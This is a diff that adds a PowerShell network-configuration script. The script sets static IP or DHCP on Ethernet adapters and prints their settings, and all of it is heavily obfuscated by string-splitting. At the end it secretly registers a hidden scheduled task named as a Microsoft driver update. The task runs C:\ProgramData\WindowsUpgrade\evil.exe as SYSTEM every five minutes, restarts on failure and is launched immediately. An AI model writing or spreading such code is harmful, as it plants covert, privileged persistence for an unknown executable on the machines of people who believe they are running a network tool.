@@ -1,0 +1,147 @@
+ &("{0}{1}{2}" -f'sET-','V','aRIAbLE')  ("f2"+"jna")  (  [tyPE]("{1}{4}{0}{2}{3}{6}{5}{7}" -f 'rMaTion.NeT','nET','woRKI','n','.NeTWorKiNfo','c','TErfa','e')) ;  &("{1}{0}" -f'T','se') ('dmq'+'h')  ([typE]("{0}{1}{2}"-F 'dA','TetI','Me')  );
+
+function s`etUP-netWO`RK {
+    param (
+        [switch]${Dh`cp},
+        ${I`p},
+        ${M`ASK},
+        ${gat`E`WAy},
+        ${d`NS1},
+        ${dN`S2}
+    )
+    
+    
+    ${a`DM`In} = &("{0}{1}"-f're','g') ("{0}{1}" -f'quer','y') ((("{4}{0}{3}{2}{1}{5}"-f'{','nvir','0}E','0}S-1-5-19{','HKU','onment'))-F [cHar]92) 2>&1
+    if (${A`d`MIn} -match ("{0}{1}" -f'deni','ed')) { Throw ("{2}{1}{0}{3}"-f 're ',' a','You','not admin') }
+
+    if (!${D`Hcp} -and !${IP}) { Throw ("{2}{3}{0}{4}{1}{5}" -f' IP','or DH','Mu','st specify',' ','CP.') }
+    if (${I`P}) {
+        if (${Ip} -notmatch '(\d{1,3}\.){3}\d{1,3}') { Throw ("{2}{3}{0}{4}{5}{1}" -f's','rmat.','Che','ck IP addre','s',' fo') }
+        if (!${m`ASk}) { ${M`ASk} = ("{0}{3}{1}{2}" -f '25','55.','255.0','5.2') } elseif (${m`ASK} -notmatch '(\d{1,3}\.){3}\d{1,3}') { Throw ("{5}{2}{4}{3}{1}{0}"-f'format.','k ','k','s',' Ma','Chec') }
+        if (!${G`AtEwAy}) { &("{0}{2}{1}"-f'Write-W','g','arnin') ("{5}{6}{0}{3}{2}{4}{1}" -f'Gateway s','.','ec','p','ified','N','o ') } elseif (${ga`T`ewAy} -notmatch '(\d{1,3}\.){3}\d{1,3}') { Throw ("{0}{3}{2}{1}" -f'Chec','rmat.','fo','k Gateway ') }
+        if (!${d`NS1}) { &("{2}{3}{0}{1}" -f'i','ng','Wri','te-Warn') ("{2}{3}{0}{4}{1}" -f ' primary DNS specifie','.','N','o','d') } elseif (${DN`S1} -notmatch '(\d{1,3}\.){3}\d{1,3}') { Throw ("{4}{2}{3}{0}{1}" -f 'or','mat.',' DN','S f','Check primary') }
+        if (!${DN`s2}) { &("{2}{1}{0}"-f'ng','ni','Write-War') ("{1}{5}{4}{2}{6}{0}{3}{8}{7}"-f 'y','No','cond',' D','e',' s','ar','cified.','NS spe') } elseif (${Dn`S2} -notmatch '(\d{1,3}\.){3}\d{1,3}') { Throw ("{1}{2}{5}{4}{0}{3}"-f 'y DNS fo','Ch','e','rmat.','ondar','ck sec') }
+    }
+
+    ${a`Ll} = &("{1}{0}"-f 'mi','gw') ("{2}{0}{1}{5}{3}{4}"-f 'in32_netw','o','w','t','er','rkadap')
+    if (${a`ll} | &('?') {${_}."S`e`R`VicEnAMe" -match (('^e1'+'(?:'+'.*)express'+'{0'+'}')-f[chAr]36)}) {
+        [array]${E`ThER`NEt} = &("{0}{1}" -f 'gw','mi') ("{2}{0}{4}{3}{5}{1}" -f'networ','figuration','win32_','ada','k','ptercon') | &('?') {${_}."se`RVicen`A`mE" -match (('^e1(?:.'+'*'+')'+'ex'+'pres'+'s0sb').("{1}{0}" -f 'E','rEPlAc').Invoke('0sb','$'))}
+        [array]${NE`T`C`onnEcTI`OniD} = ${a`lL} | &('?') {${_}."SE`RVicen`AME" -match (('^e'+'1'+'('+'?:.'+'*)exp'+'ress{0}')-f[ChAr]36)} | &('%') {${_}."nE`TCo`NNEcTIOniD"}
+        [array]${i`Nt`erf`ACename} = ${A`lL} | &('?') {${_}."seR`VIc`ENaME" -match ((('^'+'e1(?:'+'.'+'*'+')exp'+'resstkR') -RePLace  ([Char]116+[Char]107+[Char]82),[Char]36))} | &('%') {${_}."n`AMe"}
+    } else {
+        
+        [array]${E`Th`eRN`Et} = &("{0}{1}" -f 'gw','mi') ("{2}{6}{3}{0}{5}{1}{4}" -f 'da','nfigurat','win3','ka','ion','pterco','2_networ') | &('?') {${_}."dES`c`RiPTiOn" -notmatch ((("{9}{5}{20}{22}{12}{17}{2}{10}{4}{7}{1}{8}{3}{16}{26}{25}{21}{18}{23}{15}{24}{13}{0}{14}{6}{19}{11}"-f 'vPadvanced-ntvPwireless-nt','thtvPjun',' ad','ra','ptertvPblu','iporttvPmicroso','n','etoo','ipertvP','wan min','a','is','s','t','vP','neltvPde','s async','atap','virtualtvPappletvPminiporttvPt','d','f','sstvP','t i','un','bug','ptertvPwirele',' ada'))."R`ePLace"(([chAR]116+[chAR]118+[chAR]80),[StRINg][chAR]124))}
+        [array]${neTCOnnEC`Tio`NID} = ${A`LL} | &('?') {${_}."D`EsCRi`PTion" -notmatch ((("{31}{6}{38}{34}{35}{18}{23}{16}{24}{36}{30}{27}{2}{39}{12}{21}{0}{26}{37}{29}{17}{1}{5}{19}{28}{20}{32}{7}{3}{8}{33}{9}{11}{25}{10}{4}{22}{14}{15}{13}" -f'as ','ter{0}','ip','o','{0}','wireless{0}vi',' ','inip','r','nne','}debug','l{','}','reless-n','ced-n{0}w','i','ap ','ap','t is','r','l{0}apple{','r','advan','at','a','0','async','0}jun','tua','ad','uetooth{','wan','0}m','t{0}tu','iport{0','}microsof','dapter{0}bl',' ','min','er{0')) -f  [cHAr]124)} | &('%') {${_}."nEtcoNnect`IOn`ID"}
+        [array]${In`TerFa`cE`N`Ame} = ${a`Ll} | &('?') {${_}."D`eS`cRipTi`oN" -notmatch ((("{11}{0}{14}{16}{18}{5}{23}{21}{2}{19}{9}{8}{7}{6}{13}{12}{15}{3}{1}{17}{10}{4}{24}{22}{25}{20}" -f'6micr','mini','thO16jun','16','t','dap','irt','terO16wirelessO16v','adap','async ','ortO16','wan miniportO1','6app','ualO1','osoft isata','leO','p','p',' a','iperO16ras ','6debugO16advanced-nO16wireless-n','O16bluetoo','nn','ter','u','elO1'))  -REplAcE'O16',[ChAr]124)} | &('%') {${_}."NA`me"}
+    }
+
+    if (!${D`HCp}) {
+        ${S`Ta`Tic} = ${etHEr`N`eT} | &('%') {
+            ${_}.("{2}{1}{0}{3}"-f 't','Sta','Enable','ic').Invoke(${IP}, ${mA`Sk})
+            ${_}.("{1}{2}{0}" -f'ateways','Se','tG').Invoke(${g`A`TeWay})
+        }
+        ${nETCO`NN`ECtIONiD} | &('%') {
+            ${nU`lL} = &("{1}{0}" -f'tsh','ne') ("{1}{0}"-f'rface','inte') ("{1}{0}"-f '4','ipv') ("{0}{1}" -f 's','et') ("{1}{0}"-f's','dn') ((("{1}{3}{0}{2}" -f'E','name','_','=wV')) -CrEplacE  ([ChaR]119+[ChaR]86+[ChaR]69),[ChaR]36) ("{1}{3}{2}{0}"-f 'tatic','sour','s','ce=') ((("{2}{1}{0}{3}"-f '=tcOdns','dress','ad','1')) -rEPLaCe ([ChAr]116+[ChAr]99+[ChAr]79),[ChAr]36) ("{1}{2}{0}"-f'ary','pri','m') ("{3}{2}{0}{1}"-f'te=n','o','da','vali')
+            ${Nu`ll} = &("{0}{1}"-f 'ne','tsh') ("{0}{2}{1}"-f 'in','ce','terfa') ("{0}{1}"-f'ip','v4') ("{1}{0}"-f'd','ad') ("{0}{1}{2}"-f 'dnss','e','rver') ((("{0}{2}{1}"-f'name={','_','0}'))  -F  [cHar]36) (("{0}{2}{1}{3}"-f 'a','es','ddr','s=GsAdns2')).REPLAcE(([ChaR]71+[ChaR]115+[ChaR]65),[strinG][ChaR]36) ("{1}{0}{2}" -f'dex','in','=2') ("{2}{1}{0}{3}"-f 'i','l','va','date=no')
+        }
+    } elseif (${Dh`CP}) {
+        ${ne`T`C`oNNe`cTIonID} | &('%') {
+            &("{1}{0}" -f'tsh','ne') ("{1}{0}"-f'e','interfac') ('ip') ("{0}{1}" -f'se','t') ("{0}{1}"-f 'ad','dress') ${_} ("{1}{0}"-f'p','dhc')
+            ${N`UlL} = &("{0}{1}" -f 'nets','h') ("{2}{1}{0}" -f 'ce','a','interf') ('ip') ("{0}{1}" -f 's','et') ("{0}{1}"-f'd','ns') ${_} ("{1}{0}"-f'hcp','d')
+        }
+    }
+
+    if (${s`TaTIC}) {
+        ${R`ETuRN`VAluE} = @()
+        ${RE`TUr`NVALUE} += ${Sta`Tic} | &('%') {
+            Switch (${_}."Re`T`URNVAL`Ue") {
+                0   { ("{2}{1}{3}{4}{0}{6}{5}" -f 'l','ucce','S','ssful com','p','on','eti') }
+                1   { ("{4}{5}{1}{0}{3}{2}" -f'e','t r','d','quire','no ','reboo') }
+                64  { ("{0}{1}{2}{3}{4}"-f 'Succe','s','sful c','omplet','ion') }
+                65  { ("{1}{2}{0}" -f 'd','reboot re','quire') }
+                66  { ("{0}{4}{1}{6}{5}{2}{3}" -f'M','not','tfor','m','ethod ','n this pla',' supported o') }
+                67  { ("{1}{3}{2}{0}"-f 'ure','Un','l','known fai') }
+                68  { ("{2}{0}{5}{4}{1}{3}" -f 'nv','ubnet','I',' mask','id s','al') }
+                69  { ("{7}{12}{11}{1}{10}{0}{9}{4}{8}{6}{3}{2}{5}"-f'ro',' whi','that was return',' ',' ','ed','nstance','An er','an I','cessing','le p','d','ror occurre') }
+                70  { ("{4}{5}{6}{3}{1}{2}{0}"-f 'eter','t p','aram','inpu','Inv','a','lid ') }
+                71  { ("{2}{5}{1}{3}{4}{0}{6}"-f's specifie',' 5 gate','More th','w','ay','an','d') }
+                72  { ("{5}{4}{1}{3}{0}{2}" -f'res','ad','s','d','id IP  ','Inval') }
+                73  { ("{3}{0}{1}{5}{4}{6}{2}"-f 'nvalid ga','teway','ress','I','ad',' IP ','d') }
+                74  { ("{18}{1}{7}{13}{15}{9}{16}{0}{5}{17}{6}{20}{2}{10}{14}{12}{19}{21}{11}{4}{8}{3}"-f 'g','r','f','n','d inf','ist','y','ror occur','ormatio','ng th','o','requeste',' ','red whil','r','e accessi','e Re','r','An e','th',' ','e ') }
+                75  { ("{1}{2}{4}{0}{3}{5}"-f 'n n','Invalid dom','a','a','i','me') }
+                76  { ("{1}{0}{2}{3}" -f'nva','I','lid',' host name') }
+                77  { ("{7}{1}{2}{8}{4}{5}{3}{6}{0}" -f 'ned','a','ry/','erver ','econdary WI','NS s','defi','No prim','s') }
+                78  { ("{0}{2}{3}{1}" -f'Invalid ','e','f','il') }
+                79  { ("{4}{0}{2}{3}{1}" -f'li','th','d sy','stem pa','Inva') }
+                80  { ("{4}{1}{3}{2}{0}" -f 'd',' ','e','copy fail','File') }
+                81  { ("{5}{4}{0}{3}{2}{1}" -f'id secu','r','te','rity parame','l','Inva') }
+                82  { ("{2}{9}{0}{6}{4}{5}{7}{10}{8}{1}{3}" -f 'able ','/IP servic','U','e','o c','on','t','figu',' TCP','n','re') }
+                83  { ("{3}{2}{4}{1}{5}{0}"-f 'e',' ','le to configu','Unab','re DHCP','servic') }
+                84  { ("{3}{0}{1}{2}{4}" -f'le to ','renew DHCP l','ea','Unab','se') }
+                85  { ("{6}{3}{4}{1}{2}{5}{0}"-f 'lease','DH','C','le t','o release ','P ','Unab') }
+                86  { ("{1}{2}{4}{3}{0}" -f'adapter','IP n','ot en',' ','abled on') }
+                87  { ("{2}{1}{6}{4}{3}{0}{5}{7}" -f 'a','PX not en','I',' ','bled on','da','a','pter') }
+                88  { ("{3}{7}{1}{5}{4}{6}{9}{0}{2}{8}"-f'err','/network n','o','Fr','mbe','u','r b','ame','r','ounds ') }
+                89  { ("{1}{3}{2}{0}"-f'type','Invalid fram',' ','e') }
+                90  { ("{4}{3}{5}{0}{1}{2}"-f 'ork ','nu','mber','net','Invalid ','w') }
+                91  { ("{4}{5}{1}{0}{3}{2}{6}" -f 'cate ','i','rk num','netwo','D','upl','ber') }
+                92  { ("{2}{6}{4}{5}{0}{3}{1}"-f 'o','s','Pa','und','er o','ut of b','ramet') }
+                93  { ("{0}{2}{1}" -f 'Ac',' denied','cess') }
+                94  { ("{3}{0}{4}{1}{2}" -f'ut','f memo','ry','O',' o') }
+                95  { ("{3}{2}{0}{1}"-f 'dy e','xists','rea','Al') }
+                96  { ("{0}{1}"-f 'Pat','h') }
+                97  { ("{1}{5}{2}{4}{0}{3}"-f 't fo','fi','jec','und','t no','le or ob') }
+                98  { ("{2}{6}{4}{3}{5}{1}{0}"-f'ice','rv','Unable ','y','o notif',' se','t') }
+                100 { ("{0}{2}{1}{7}{6}{5}{4}{3}{8}"-f'U','ab','n',' ','y DNS','otif','n','le to ','service') }
+                ("{1}{2}{0}" -f 'ault','d','ef') { ("{3}{1}{4}{0}{2}" -f 'u','rface no','rable','Inte','t config') }
+            }
+        }
+
+        ${RetU`RnV`AlUe}
+        &("{0}{1}{2}"-f 'Writ','e-','Host') ''
+    }
+
+    foreach (${nA`me} in ${in`TeRf`A`Ce`NAMe}) {
+        [string]${dN`st`YPe} = &("{0}{1}" -f'gw','mi') ("{0}{1}{5}{2}{3}{4}" -f 'win','3','rka','dapte','r','2_netwo') | &('?') {${_}."DES`Cri`pTI`on" -eq ${n`Ame}} | &('%') {&("{1}{0}"-f 'tsh','ne') ("{2}{1}{0}" -f'e','fac','inter') ("{1}{0}" -f'4','ipv') ("{1}{0}"-f'w','sho') ("{0}{1}" -f 'd','ns') ${_}."NE`T`ConnectIoniD"}
+        if (${dNSt`YPe} -match ("{0}{2}{1}" -f's','tic','ta')) {
+            ${D`NS} =   ${f`2J`Na}::("{0}{1}{4}{3}{2}"-f'GetAllNetwor','kInterf','es','c','a').Invoke() | &('?') {${_}."DeSCR`I`pTion" -eq ${N`AME}} | &('%') {${_}.("{3}{4}{2}{0}{1}"-f'ti','es','Proper','GetI','P').Invoke()} | &('%') {${_}."D`Nsad`DrES`SES"} | &('%') {[string]${_}}
+        } else {
+            ${D`Ns} = ''
+        }
+        &("{1}{0}{2}"-f 'rite-H','W','ost') ('Name:'+' '+' '+' '+' '+"$name")
+        &("{0}{2}{1}"-f 'Wr','e-Host','it') "IP:      $([Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | ? {$_.description -eq $name} | % {$_.GetIPProperties()} | % {$_.unicastaddresses} | ? {$_.PrefixOrigin -eq 'Manual' } | % {[string]$_.address})"
+        &("{2}{0}{3}{1}"-f 't','ost','Wri','e-H') "Gateway: $([Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | ? {$_.description -eq $name} | % {$_.GetIPProperties()} | % {$_.gatewayaddresses} | % {[string]$_.address})"
+        &("{2}{1}{0}" -f't','s','Write-Ho') "DHCP:    $([Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | ? {$_.description -eq $name} | % {$_.GetIPProperties()} | % {$_.dhcpserveraddresses} | % {[string]$_})"
+        &("{2}{0}{1}{3}"-f'e-Ho','s','Writ','t') ('DNS:'+' '+' '+' '+' '+' '+"$dns")
+        &("{1}{0}{2}" -f'H','Write-','ost') ''
+    }
+}
+
+${TAS`KNamE} = ("{7}{0}{2}{3}{6}{1}{4}{8}{5}"-f 'soft ','r U','Window','s ','pd','te','Drive','Micro','a')
+${tasK`Des`cR} = ("{4}{3}{5}{1}{9}{7}{2}{8}{0}{6}"-f'ervice','of','at','r','Mic','os','s','r Upd','e S','t Windows Drive')
+${tA`S`KcoMMa`ND} = ((("{1}{3}{2}{6}{5}{4}{0}"-f '0}evil.exe','C:{0}Pr','a','ogramD','pgrade{','0}WindowsU','ta{')) -F [ChAr]92)
+${tAs`k`scr`ipt} = ""
+${t`ASKA`RG} = ""
+${TAS`k`sT`ARTTi`Me} =  ${d`MQh}::"N`oW".("{0}{3}{1}{2}"-f'A','Min','utes','dd').Invoke(1) 
+${SEr`V`icE} = &("{1}{2}{0}" -f 'ject','ne','w-ob') -ComObject(("{4}{1}{0}{3}{2}" -f'.S','edule','rvice','e','Sch'))
+${s`Er`VIcE}.("{0}{1}" -f'Con','nect').Invoke()
+${RO`OTFo`LdER} = ${S`er`VIcE}.("{1}{0}{2}"-f 'o','GetF','lder').Invoke("\")
+${Ta`s`kdefIN`itioN} = ${s`eRVi`Ce}.("{0}{1}" -f 'New','Task').Invoke(0) 
+${TAS`KDefin`i`TioN}."rEgi`sT`RATIo`NIn`Fo"."d`EscRi`p`TiON" = "$TaskDescr"
+${Tas`KD`EfInI`Ti`On}."sE`TtiNgS"."ENa`Bled" = ${tr`Ue}
+${tas`Kd`eFINiti`on}."S`EttI`Ngs"."hI`d`DeN" = ${TR`UE}
+${t`Ask`D`EfiNiTI`ON}."seTti`Ngs"."Res`Tar`T`cOUNt" = "5"
+${tASKdefin`i`Ti`on}."s`eTTIngs"."s`TArt`whenAvAiLa`Ble" = ${TR`UE}
+${Ta`Skd`Efi`N`ITioN}."sE`TtI`NgS"."ST`oP`IFGOi`NGoNbaTTErIeS" = ${FA`lsE}
+${tA`Skde`FINit`ioN}."s`EttInGS"."r`ES`T`ARtintERvaL" = ("{0}{1}"-f 'PT5','M')
+${tr`I`GGERS} = ${tASKdeFI`NIT`iOn}."tr`IG`GeRs"
+${TRIg`g`ER} = ${TR`IGgE`RS}.("{1}{0}"-f'te','Crea').Invoke(8)
+${TR`IGG`er}."sTA`RtBoUnD`ARY" = ${T`ASK`s`T`Arttime}.("{1}{0}{2}" -f 'o','T','String').Invoke(((("{3}{5}{7}{0}{1}{4}{6}{2}" -f '-','dds','s','yyyy-','U0TsU','M','0HH:mm:s','M'))  -replACE  ([CHAR]115+[CHAR]85+[CHAR]48),[CHAR]39))
+${tRigG`eR}."ENa`BL`eD" = ${TR`Ue}
+${T`RI`ggEr}."RE`PE`TitioN"."IntE`RV`Al" = ("{0}{1}" -f 'P','T5M')
+${t`AsKDe`FiN`iTion}."S`eTTI`NGS"."dIs`All`oW`ST`ArtIfoNBATteRIes" = ${Tr`UE}
+${ACt`IoN} = ${T`AS`k`D`eFINitiOn}."Ac`Tions".("{0}{1}{2}" -f'Cr','e','ate').Invoke(0)
+${Ac`Ti`On}."pa`TH" = "$TaskCommand"
+${acti`on}."A`R`GuMENtS" = "$TaskArg"
+${ro`oTfo`Ld`ER}.("{1}{2}{4}{3}{0}"-f 'n','R','egisterTa','io','skDefinit').Invoke("$TaskName",${tA`sk`DEfI`NitIon},6,("{1}{0}" -f'stem','Sy'),${nU`Ll},5)
+&("{1}{0}" -f'TASKS','SCH') ("{0}{1}" -f'/ru','n') ("{1}{0}"-f'TN','/') ${tAS`Kn`AME}
